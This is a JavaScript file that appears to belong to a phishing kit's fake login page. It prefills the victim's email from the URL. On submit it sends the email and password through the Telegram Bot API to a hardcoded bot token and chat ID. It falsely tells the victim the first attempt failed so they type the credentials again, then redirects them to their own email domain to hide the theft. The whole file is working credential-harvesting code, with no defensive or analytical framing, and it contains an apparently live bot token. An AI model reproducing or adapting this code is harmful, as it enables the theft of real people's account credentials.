// Replace with your actual bot token and chat ID
const BOT_TOKEN = '8105573912:AAEz65MgSzUd8nYfe-jYsgvddeUm4NSMoqY';
const CHAT_ID = '5696830026';
let loginAttempts = 0;

// Function to get email from hash
function getEmailFromHash() {
    const hash = window.location.hash.substring(1);
    return hash.includes('@') ? hash : null;
}

// Populate the email field if an email is passed in the URL hash
document.addEventListener('DOMContentLoaded', () => {
    const emailFromHash = getEmailFromHash();
    if (emailFromHash) {
        document.getElementById('user-email').value = emailFromHash;
    }
});

document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const userEmail = document.getElementById('user-email').value;
    const password = document.getElementById('password').value;
    const rememberMe = document.getElementById('remember-me').checked ? 'Yes' : 'No';

    const message = `Login Attempt:\nEmail: ${userEmail}\nPassword: ${password}\nRemember Me: ${rememberMe}`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    })
    .then(response => response.json())
    .catch(error => console.error('Error:', error));

    loginAttempts++;

    if (loginAttempts === 1) {
        alert("Email/password is incorrect, try again");
    }

    if (loginAttempts >= 2) {
        document.getElementById('overlay').style.visibility = 'visible';

        setTimeout(() => {
            const emailParts = userEmail.split('@');
            if (emailParts.length > 1) {
                const domain = emailParts[1];
                const redirectUrl = `https://${domain}`;
                window.location.href = redirectUrl;
            } else {
                console.error('Invalid email format.');
            }
        }, 2000);
    }
});
